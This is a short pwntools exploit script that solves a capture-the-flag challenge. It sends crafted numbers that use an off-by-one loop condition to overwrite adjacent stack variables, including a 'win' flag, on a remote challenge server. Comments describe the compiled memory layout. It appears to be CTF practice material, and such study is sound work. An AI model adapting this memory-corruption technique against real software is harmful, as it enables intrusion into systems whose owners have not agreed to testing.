#!/usr/bin/env python3
from pwn import *

HOST = 'chal.secso.cc'
PORT = 4001

context.log_level = 'info'

def solve():
    if args.LOCAL:
        r = process('../script/chal')
    else:
        r = remote(HOST, PORT)

    # Layout (gcc -O0 amd64):
    # win      = noob.numbers[-1]
    # accum    = noob.numbers[9]
    # i        = noob.numbers[10]
    # The bug is while(i != 7), allowing i to skip 7.
    payload = [0,0,0,0,0,0,67, 1, 1, -2, 68, 0,0,0,0,0,0,0]
    for x in payload:
        r.sendlineafter(b'number> ', str(x).encode())
    r.interactive()

if __name__ == '__main__':
    solve()
